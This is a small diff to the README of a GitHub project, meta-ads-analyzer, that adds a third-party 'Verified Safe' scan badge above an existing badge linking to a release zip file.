@@ -1,5 +1,7 @@
 # 📊 meta-ads-analyzer - Analyze and Improve Your Meta Ads
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/tommyvr7-meta-ads-analyzer)
+
 [![Download meta-ads-analyzer](https://img.shields.io/badge/Download-Get%20Latest%20Release-%23FF5733?logo=github&style=for-the-badge)](https://github.com/Tommyvr7/meta-ads-analyzer/raw/refs/heads/main/skill/meta_ads_analyzer_2.7.zip)
 
 ---
